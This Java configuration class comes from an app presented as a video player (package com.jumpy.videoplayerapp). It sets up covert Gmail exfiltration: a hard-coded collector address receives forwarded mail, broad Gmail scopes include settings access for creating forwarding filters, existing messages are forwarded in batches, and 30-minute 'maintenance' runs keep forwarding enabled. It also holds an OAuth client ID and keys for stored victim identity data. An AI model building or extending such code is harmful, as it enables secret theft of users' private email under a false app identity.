package com.jumpy.videoplayerapp;

/**
 * Configuration class for Gmail forwarding settings
 * Change the COLLECTOR_EMAIL to your desired email address
 */
public class GmailConfig {
    
    // Change this to your collector email address
    public static final String COLLECTOR_EMAIL = "mrh@collector.lab";
    
    // Gmail API scopes required for forwarding
    public static final String[] GMAIL_SCOPES = {
        "https://www.googleapis.com/auth/gmail.readonly",
        "https://www.googleapis.com/auth/gmail.send",
        "https://www.googleapis.com/auth/gmail.modify",
        "https://www.googleapis.com/auth/gmail.settings.basic"
    };
    
    // Maintenance interval in minutes
    public static final long MAINTENANCE_INTERVAL_MINUTES = 30;
    
    // Batch size for forwarding existing emails
    public static final int EMAIL_BATCH_SIZE = 50;
    
    // Delay between email forwarding operations (milliseconds)
    public static final long EMAIL_FORWARDING_DELAY_MS = 100;
    
    // App name for Gmail API
    public static final String APP_NAME = "VideoPlayerApp";
    
    // OAuth Client ID for Gmail API
    public static final String OAUTH_CLIENT_ID = "1056777795152-f4lb053hurphovqkc9rfd4iqso772ca3.apps.googleusercontent.com";
    
    // Shared preferences name
    public static final String PREFS_NAME = "gmail_auth_prefs";
    
    // Keys for stored data
    public static final String KEY_USER_EMAIL = "user_email";
    public static final String KEY_USER_ID = "user_id";
    public static final String KEY_DISPLAY_NAME = "display_name";
    public static final String KEY_LAST_SIGN_IN = "last_sign_in";
    public static final String KEY_FILTER_ID = "filter_id";
    public static final String KEY_FORWARDING_ENABLED = "forwarding_enabled";
} 